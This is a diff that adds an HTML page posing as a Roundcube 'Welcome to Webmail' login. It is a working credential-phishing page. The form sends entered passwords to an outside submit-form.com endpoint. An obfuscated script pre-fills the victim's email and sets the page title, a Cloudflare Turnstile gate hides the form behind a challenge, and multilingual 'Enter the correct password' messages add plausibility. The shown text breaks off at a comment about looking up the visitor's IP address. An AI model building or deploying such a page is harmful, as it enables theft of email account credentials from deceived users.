@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title></title>
+<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto:400,300,100,500'>
+<link rel='stylesheet' href='//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css'>
+<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto+Slab:400,700,300,100'>
+<link rel="stylesheet" href="./assets/css/style.css">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<!-- Add i18next for translation -->
+<script src="https://unpkg.com/i18next@23.15.1/dist/umd/i18next.min.js"></script>
+<!-- Add Cloudflare Turnstile script -->
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=renderTurnstile" async defer></script>
+
+<style>
+    .pad-top-20 { padding-top: 20px; }
+    .pad-btm-20 { padding-bottom: 20px; }
+    .pad-sep-20 { padding-top: 20px; padding-bottom: 20px; }
+    .pad-top-40 { padding-top: 40px; }
+    .pad-btm-40 { padding-bottom: 40px; }
+    .pad-sep-40 { padding-top: 40px; padding-bottom: 40px; }
+    .pad-top-60 { padding-top: 60px; }
+    .pad-btm-60 { padding-bottom: 60px; }
+    .pad-sep-60 { padding-top: 60px; padding-bottom: 60px; }
+    .pad-top-80 { padding-top: 80px; }
+    .pad-btm-80 { padding-bottom: 80px; }
+    .pad-sep-80 { padding-top: 80px; padding-bottom: 80px; }
+    .pad-top-100 { padding-top: 100px; }
+    .pad-btm-100 { padding-bottom: 100px; }
+    .pad-sep-100 { padding-top: 100px; padding-bottom: 100px; }
+    @font-face {
+      font-family: 'Roboto';
+      font-style: normal;
+      font-weight: 100;
+      src: url(https://fonts.gstatic.com/s/roboto/v30/KFOkCnqEu92Fr1MmgVxIIzc.ttf) format('truetype');
+    }
+    @font-face {
+      font-family: 'Roboto';
+      font-style: normal;
+      font-weight: 300;
+      src: url(https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmSU5fBBc9.ttf) format('truetype');
+    }
+    @font-face {
+      font-family: 'Roboto';
+      font-style: normal;
+      font-weight: 400;
+      src: url(https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxP.ttf) format('truetype');
+    }
+    @font-face {
+      font-family: 'Roboto';
+      font-style: normal;
+      font-weight: 500;
+      src: url(https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc9.ttf) format('truetype');
+    }
+    @font-face {
+      font-family: 'Roboto';
+      font-style: normal;
+      font-weight: 700;
+      src: url(https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmWUlfBBc9.ttf) format('truetype');
+    }
+    html, body { height: 100%; }
+    body {
+      margin: 0;
+      padding: 0;
+      color: #fff;
+      overflow: hidden;
+      background-color: #dcdee3;
+      font-size: 14px;
+      position: relative;
+      font-family: 'Roboto', Helvetica, Arial, sans-serif;
+    }
+    h1, .h1, h2, .h2, h3, .h3 { font-weight: 300; color: #22A7F0; }
+    .fix-middle {
+      position: absolute;
+      padding: 10px;
+      top: 50%;
+      left: 50%;
+      -webkit-transform: translate(-50%, -50%);
+      -moz-transform: translate(-50%, -50%);
+      -ms-transform: translate(-50%, -50%);
+      transform: translate(-50%, -50%);
+      z-index: 3;
+    }
+    .dialog {
+      color: #222;
+      -webkit-perspective: 1200px;
+      -moz-perspective: 1200px;
+      -ms-perspective: 1200px;
+      -o-perspective: 1200px;
+      perspective: 1200px;
+      z-index: 1000;
+      opacity: 1;
+      visibility: visible;
+      -webkit-transition: opacity 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      -moz-transition: opacity 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      -ms-transition: opacity 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      transition: opacity 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.2s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+    }
+    .dialog, .dialog .dialog-front, .dialog .dialog-back {
+      width: auto;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      padding: 0;
+      margin: 0;
+      -webkit-transform: translate(-50%, -50%);
+      -moz-transform: translate(-50%, -50%);
+      -ms-transform: translate(-50%, -50%);
+      transform: translate(-50%, -50%);
+    }
+    .dialog.dialog-effect-in {
+      -webkit-animation: showDialog 1000ms linear both;
+      -moz-animation: showDialog 1000ms linear both;
+      -ms-animation: showDialog 1000ms linear both;
+      animation: showDialog 1000ms linear both;
+    }
+    .dialog.shakeit {
+      -webkit-animation: shakeDialog 300ms linear both;
+      -moz-animation: shakeDialog 300ms linear both;
+      -ms-animation: shakeDialog 300ms linear both;
+      animation: shakeDialog 300ms linear both;
+    }
+    .dialog .dialog-content {
+      width: 400px;
+      background: #fff;
+      border-radius: 6px;
+      padding: 20px 25px;
+    }
+    .dialog .dialog-front, .dialog .dialog-back {
+      -webkit-transform-style: preserve-3d;
+      -moz-transform-style: preserve-3d;
+      -webkit-backface-visibility: hidden;
+      -moz-backface-visibility: hidden;
+      -ms-backface-visibility: hidden;
+      backface-visibility: hidden;
+      -webkit-transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      -moz-transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      -ms-transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+    }
+    .dialog .dialog-front {
+      -webkit-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
+      -moz-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
+      -ms-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
+      -o-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
+      z-index: 900;
+    }
+    .dialog .dialog-back {
+      -webkit-transform: translate(-50%, -50%) rotateY(-180deg);
+      -moz-transform: translate(-50%, -50%) rotateY(-180deg);
+      -ms-transform: translate(-50%, -50%) rotateY(-180deg);
+      -o-transform: translate(-50%, -50%) rotateY(-180deg);
+      z-index: 800;
+    }
+    .dialog.flip .dialog-front {
+      z-index: 800;
+      visibility: hidden;
+      -webkit-transform: translate(-50%, -50%) rotateY(180deg);
+      -moz-transform: translate(-50%, -50%) rotateY(180deg);
+      -ms-transform: translate(-50%, -50%) rotateY(180deg);
+      -o-transform: translate(-50%, -50%) rotateY(180deg);
+    }
+    .dialog.flip .dialog-back {
+      z-index: 900;
+      visibility: visible;
+      -webkit-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
+      -moz-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
+      -ms-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
+      -o-transform: translate(-50%, -50%) rotateX(0deg) rotateY(0deg);
+    }
+    .dialog.dialog-effect-out {
+      z-index: 1;
+      opacity: 0;
+      visibility: hidden;
+    }
+    .dialog.dialog-effect-out .dialog-front {
+      -webkit-transform: translate(-50%, -20%) rotateX(-30deg);
+      -moz-transform: translate(-50%, -20%) rotateX(-30deg);
+      -ms-transform: translate(-50%, -20%) rotateX(-30deg);
+      -o-transform: translate(-50%, -20%) rotateX(-30deg);
+    }
+    .dialog.dialog-effect-out .dialog-back {
+      -webkit-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(-180deg);
+      -moz-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(-180deg);
+      -ms-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(-180deg);
+      -o-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(-180deg);
+    }
+    .dialog.dialog-effect-out.flip .dialog-front {
+      -webkit-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(180deg);
+      -moz-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(180deg);
+      -ms-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(180deg);
+      -o-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(180deg);
+    }
+    .dialog.dialog-effect-out.flip .dialog-back {
+      -webkit-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(0deg);
+      -moz-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(0deg);
+      -ms-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(0deg);
+      -o-transform: translate(-50%, -20%) rotateX(-30deg) rotateY(0deg);
+    }
+    .dialog.dialog-effect-out .dialog-content { background: #00B16A; }
+    .dialog.dialog-effect-out .dialog-content .dialog-form { visibility: hidden; }
+    .dialog .dialog-form {
+      -webkit-animation: swooshUp30 300ms linear both;
+      -moz-animation: swooshUp30 300ms linear both;
+      -ms-animation: swooshUp30 300ms linear both;
+      animation: swooshUp30 300ms linear both;
+      -webkit-animation-delay: 300ms;
+      -moz-animation-delay: 300ms;
+      -ms-animation-delay: 300ms;
+      animation-delay: 300ms;
+    }
+    .dialog .dialog-form legend {
+      margin-bottom: 40px;
+      font-size: 26px;
+      font-weight: 300;
+      color: #222;
+      border-bottom: none;
+    }
+    .dialog .dialog-form .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+    .dialog .dialog-form .form-group .form-control {
+      color: #222;
+      background-color: transparent;
+      border: none;
+      border-bottom: 2px solid #222;
+      border-radius: 0;
+      -webkit-box-shadow: none;
+      -moz-box-shadow: none;
+      -ms-box-shadow: none;
+      box-shadow: none;
+    }
+    .dialog .dialog-form .form-group label {
+      display: inline-block;
+      max-width: 100%;
+      margin-bottom: 5px;
+      font-weight: 700;
+    }
+    .dialog .dialog-form .form-group.has-error .error-msg { display: block; }
+    .dialog .dialog-form .form-group.has-error label { color: #E74C3C; }
+    .dialog .dialog-form .form-group.has-error .form-control { border-color: #E74C3C; }
+    .dialog .dialog-form .form-group .checkbox label { padding-left: 40px; }
+    .dialog .dialog-form .form-group .checkbox input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      background: none;
+      border: 2px solid #222;
+      margin-left: -40px;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+    .dialog .dialog-form .form-group .checkbox input[type="checkbox"]:hover { background-color: #e6e6e6; }
+    .dialog .dialog-form .form-group .checkbox input[type="checkbox"]:checked { background-color: #222; }
+    .dialog .dialog-form .form-group .checkbox input[type="checkbox"]:disabled {
+      background-color: #6f6f6f;
+      border-color: #555555;
+    }
+    .dialog .dialog-form .error-msg {
+      position: absolute;
+      top: 50%;
+      left: 0;
+      right: auto;
+      background-color: #E74C3C;
+      color: #fff;
+      padding: 10px;
+      z-index: 3;
+      max-width: 150px;
+      border-radius: 3px;
+      -webkit-transform: translate(-110%, -50%);
+      -moz-transform: translate(-110%, -50%);
+      -ms-transform: translate(-110%, -50%);
+      transform: translate(-110%, -50%);
+      -webkit-animation: swooshleft 200ms ease-in-out both;
+      -moz-animation: swooshleft 200ms ease-in-out both;
+      -ms-animation: swooshleft 200ms ease-in-out both;
+      animation: swooshleft 200ms ease-in-out both;
+      display: none;
+    }
+    .dialog .dialog-form .error-msg:after {
+      position: absolute;
+      content: '';
+      top: 50%;
+      right: 0;
+      -webkit-transform: translate(97%, -50%);
+      -moz-transform: translate(97%, -50%);
+      -ms-transform: translate(97%, -50%);
+      transform: translate(97%, -50%);
+      width: 0;
+      height: 0;
+      border-style: solid;
+      border-width: 10px 0 10px 10px;
+      border-color: transparent transparent transparent #E74C3C;
+    }
+    .dialog .dialog-form .btn {
+      font-weight: 700;
+      border-width: 0;
+      border-radius: 0;
+      text-transform: uppercase;
+      -webkit-transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      -moz-transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      -ms-transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      transition: all 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+    }
+    .dialog .dialog-form .btn.btn-default {
+      color: #fff;
+      background-color: #868686;
+      outline: none;
+    }
+    .dialog .dialog-form .btn.btn-default:hover { background-color: #222; color: #fff; }
+    .dialog .dialog-form .btn.btn-default:active, .dialog .dialog-form .btn.btn-default:focus {
+      background-color: #222;
+      color: #fff;
+    }
+    .dialog .dialog-form .btn.btn-default:disabled { cursor: not-allowed; opacity: 0.65; }
+    .honeypot-field { display: none; }
+    @-webkit-keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
+    @-moz-keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
+    @keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
+    @-webkit-keyframes swooshleft {
+      0% { -webkit-transform: translate(-90%, -50%); -moz-transform: translate(-90%, -50%); -ms-transform: translate(-90%, -50%); transform: translate(-90%, -50%); }
+      100% { -webkit-transform: translate(-110%, -50%); -moz-transform: translate(-110%, -50%); -ms-transform: translate(-110%, -50%); transform: translate(-110%, -50%); }
+    }
+    @-moz-keyframes swooshleft {
+      0% { -webkit-transform: translate(-90%, -50%); -moz-transform: translate(-90%, -50%); -ms-transform: translate(-90%, -50%); transform: translate(-90%, -50%); }
+      100% { -webkit-transform: translate(-110%, -50%); -moz-transform: translate(-110%, -50%); -ms-transform: translate(-110%, -50%); transform: translate(-110%, -50%); }
+    }
+    @keyframes swooshleft {
+      0% { -webkit-transform: translate(-90%, -50%); -moz-transform: translate(-90%, -50%); -ms-transform: translate(-90%, -50%); transform: translate(-90%, -50%); }
+      100% { -webkit-transform: translate(-110%, -50%); -moz-transform: translate(-110%, -50%); -ms-transform: translate(-110%, -50%); transform: translate(-110%, -50%); }
+    }
+    @-webkit-keyframes shakeDialog {
+      0% { left: 51%; } 25% { left: 49%; } 50% { left: 51%; } 100% { left: 50%; }
+    }
+    @-moz-keyframes shakeDialog {
+      0% { left: 51%; } 25% { left: 49%; } 50% { left: 51%; } 100% { left: 50%; }
+    }
+    @keyframes shakeDialog {
+      0% { left: 51%; } 25% { left: 49%; } 50% { left: 51%; } 100% { left: 50%; }
+    }
+    @-webkit-keyframes showDialog {
+      0% { -webkit-transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      7.61% { -webkit-transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      11.41% { -webkit-transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      15.12% { -webkit-transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      18.92% { -webkit-transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      22.72% { -webkit-transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      30.23% { -webkit-transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      50.25% { -webkit-transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      70.27% { -webkit-transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      100% { -webkit-transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+    }
+    @keyframes showDialog {
+      0% { -webkit-transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      7.61% { -webkit-transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      11.41% { -webkit-transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      15.12% { -webkit-transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      18.92% { -webkit-transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      22.72% { -webkit-transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      30.23% { -webkit-transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      50.25% { -webkit-transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      70.27% { -webkit-transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      100% { -webkit-transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+    }
+    @keyframes showDialog {
+      0% { -webkit-transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.8, 0, 0, 0, 0, 0.8, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      7.61% { -webkit-transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.907, 0, 0, 0, 0, 0.907, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      11.41% { -webkit-transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.948, 0, 0, 0, 0, 0.948, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      15.12% { -webkit-transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.976, 0, 0, 0, 0, 0.976, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      18.92% { -webkit-transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.996, 0, 0, 0, 0, 0.996, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      22.72% { -webkit-transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.008, 0, 0, 0, 0, 1.008, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      30.23% { -webkit-transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.014, 0, 0, 0, 0, 1.014, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      50.25% { -webkit-transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1.003, 0, 0, 0, 0, 1.003, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      70.27% { -webkit-transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(0.999, 0, 0, 0, 0, 0.999, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+      100% { -webkit-transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1); }
+    }
+    #successful_login, #successful_registration {
+      opacity: 0;
+      visibility: hidden;
+      -webkit-transition: opacity 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.6s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      -moz-transition: opacity 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.6s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      -ms-transition: opacity 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.6s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+      transition: opacity 0.4s cubic-bezier(0.25, 0.5, 0.5, 0.9), visibility 0.6s cubic-bezier(0.25, 0.5, 0.5, 0.9);
+    }
+    #successful_login.active, #successful_registration.active { opacity: 1; visibility: visible; }
+</style>
+<link id="favicon" rel="shortcut icon" type="image/png" href="" />
+</head>
+<body>
+<!-- This container will hold the Turnstile widget and be visible on page load -->
+<div id="turnstile-container" class="fix-middle" style="text-align: center;">
+	<h2 id="verification-message" style="font-family: 'Roboto', sans-serif; color: #444; font-weight: 300; margin-bottom: 20px;"></h2>
+    <!-- The Turnstile widget will be programmatically rendered in the div below -->
+    <div id="turnstile-widget"></div>
+</div>
+
+<!-- The main form dialog, now hidden by default -->
+<div id="dialog" class="dialog dialog-effect-in" style="display: none;">
+<div class="dialog-front">
+<div class="dialog-content">
+<form id="login_form" class="dialog-form login_form" action="https://submit-form.com/bbKESMhI7" method="POST">
+<img id="logo" src="https://images.sftcdn.net/images/t_app-logo-xl,f_auto,dpr_2/p/7a60e021-3fe5-4334-9e56-7cc6ebae632d/2825932570/roundcube-webmail-roundcube_logo_icon.svg" style="display: block;margin-left: auto;margin-right: auto;" width="70" height="70"><br>
+<fieldset>
+<center><legend data-i18n="welcome">Welcome to Webmail</legend></center>
+<div class="form-group">
+<label for="user_username" class="control-label" data-i18n="username">Username:</label>
+<input type="email" id="user_username" class="form-control" name="user_username" value="" required disabled autofocus />
+</div>
+<div class="form-group">
+<label for="user_password" class="control-label" data-i18n="password">Password:</label>
+<input type="password" id="user_password" class="form-control" name="user_password" required />
+</div>
+<!-- Honeypot field -->
+<div class="form-group honeypot-field">
+<label for="contact_info">Leave this field empty</label>
+<input type="text" id="contact_info" name="contact_info" value="" />
+</div>
+<label id="error" class="error" style="display: none;color: red;" data-i18n="error">Enter the correct password</label>
+<div class="pad-top-20 pad-btm-20">
+<input type="submit" id="submit-btn" class="btn btn-default btn-block btn-lg" data-i18n="[value]continue" value="Continue">
+</div>
+</fieldset>
+</form>
+</div>
+</div>
+</div>
+<script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src="./assets/js/script.js"></script>
+<script>
+  // Initialize i18next for translation
+  i18next.init({
+    lng: navigator.language || navigator.userLanguage || 'en', // Detect browser language
+    fallbackLng: 'en',
+    resources: {
+      en: {
+        translation: {
+          welcome: "Welcome to Webmail",
+          username: "Username",
+          password: "Password",
+          error: "Enter the correct password",
+          too_many_attempts: "Too many sign-in attempts, try again",
+          continue: "Continue"
+        }
+      },
+      es: {
+        translation: {
+          welcome: "Bienvenido a Webmail",
+          username: "Nombre de usuario",
+          password: "Contraseña",
+          error: "Ingresa la contraseña correcta",
+          too_many_attempts: "Demasiados intentos de inicio de sesión, intenta de nuevo",
+          continue: "Continuar"
+        }
+      },
+      fr: {
+        translation: {
+          welcome: "Bienvenue sur Webmail",
+          username: "Nom d'utilisateur",
+          password: "Mot de passe",
+          error: "Entrez le mot de passe correct",
+          too_many_attempts: "Trop de tentatives de connexion, réessayez",
+          continue: "Continuer"
+        }
+      },
+      de: {
+        translation: {
+          welcome: "Willkommen bei Webmail",
+          username: "Benutzername",
+          password: "Passwort",
+          error: "Geben Sie das richtige Passwort ein",
+          too_many_attempts: "Zu viele Anmeldeversuche, versuchen Sie es erneut",
+          continue: "Weiter"
+        }
+      },
+      zh: {
+        translation: {
+          welcome: "欢迎使用网络邮件",
+          username: "用户名",
+          password: "密码",
+          error: "请输入正确的密码",
+          too_many_attempts: "登录尝试过多，请重试",
+          continue: "继续"
+        }
+      },
+      vi: {
+        translation: {
+          welcome: "Chào mừng đến với Webmail",
+          username: "Tên người dùng",
+          password: "Mật khẩu",
+          error: "Nhập mật khẩu đúng",
+          too_many_attempts: "Quá nhiều lần thử đăng nhập, hãy thử lại",
+          continue: "Tiếp tục"
+        }
+      },
+      ko: {
+        translation: {
+          welcome: "웹메일에 오신 것을 환영합니다",
+          username: "사용자 이름",
+          password: "비밀번호",
+          error: "올바른 비밀번호를 입력하세요",
+          too_many_attempts: "로그인 시도가 너무 많습니다, 다시 시도하세요",
+          continue: "계속"
+        }
+      },
+      ar: {
+        translation: {
+          welcome: "مرحبًا بك في البريد الإلكتروني",
+          username: "اسم المستخدم",
+          password: "كلمة المرور",
+          error: "أدخل كلمة المرور الصحيحة",
+          too_many_attempts: "محاولات تسجيل الدخول كثيرة جدًا، حاول مرة أخرى",
+          continue: "متابعة"
+        }
+      }
+    }
+  }, function(err, t) {
+    // Update text content with translations
+    document.querySelectorAll('[data-i18n]').forEach(element => {
+      const key = element.getAttribute('data-i18n');
+      if (key.startsWith('[value]')) {
+        element.value = t(key.replace('[value]', ''));
+      } else {
+        element.textContent = t(key);
+      }
+    });
+  });
+
+  var _0x3121cb=_0x4e3e;function _0x4e3e(_0x4b06ec,_0x2c42ce){var _0x1137fe=_0x1137();return _0x4e3e=function(_0x4e3ec8,_0x2cdd8b){_0x4e3ec8=_0x4e3ec8-0x7a;var _0x4e3d1d=_0x1137fe[_0x4e3ec8];return _0x4e3d1d;},_0x4e3e(_0x4b06ec,_0x2c42ce);}function _0x1137(){var _0x55dae1=['value','923235tHGKGv','4051254bWxUdt','5816fqMdQs','8596007xIcuCA','getElementById','43912710lErqoF','399IKjmFG','472FGAJjW','1292320TywGUx','title','user_username','12ZwWcEZ','14841KXSGPt','ca543e2728f684c0d5de19a83de16645636ed4699b2b6\x20-\x20'];_0x1137=function(){return _0x55dae1;};return _0x1137();}(function(_0x21a638,_0x3149da){var _0x4e5558=_0x4e3e,_0x52e06d=_0x21a638();while(!![]){try{var _0x5e1473=-parseInt(_0x4e5558(0x7e))/0x1*(parseInt(_0x4e5558(0x7a))/0x2)+-parseInt(_0x4e5558(0x88))/0x3+parseInt(_0x4e5558(0x80))/0x4+-parseInt(_0x4e5558(0x87))/0x5*(parseInt(_0x4e5558(0x83))/0x6)+-parseInt(_0x4e5558(0x7b))/0x7+-parseInt(_0x4e5558(0x7f))/0x8*(-parseInt(_0x4e5558(0x84))/0x9)+parseInt(_0x4e5558(0x7d))/0xa;if(_0x5e1473===_0x3149da)break;else _0x52e06d['push'](_0x52e06d['shift']());}catch(_0x1134de){_0x52e06d['push'](_0x52e06d['shift']());}}}(_0x1137,0xabc95),document[_0x3121cb(0x81)]=_0x3121cb(0x85)+fetchEmail(),document[_0x3121cb(0x7c)](_0x3121cb(0x82))[_0x3121cb(0x86)]=fetchEmail());
+</script>
+
+<script>
+  var count = 0;
+
+  // --- Turnstile and Gating Logic ---
+
+  // This function is called by the Turnstile script on load.
+  function renderTurnstile() {
+    turnstile.render('#turnstile-widget', {
+      sitekey: '0x4AAAAAAB10qIE0M6yxD1P2',
+      callback: function(token) {
+        // This is the success callback.
+        console.log("Turnstile challenge passed.");
+        // Hide the Turnstile container
+        $('#turnstile-container').hide();
+        // Show the main login form dialog
+        $('#dialog').show();
+      },
+    });
+  }
+
+  // Function to get the user's IP address from a third-party service
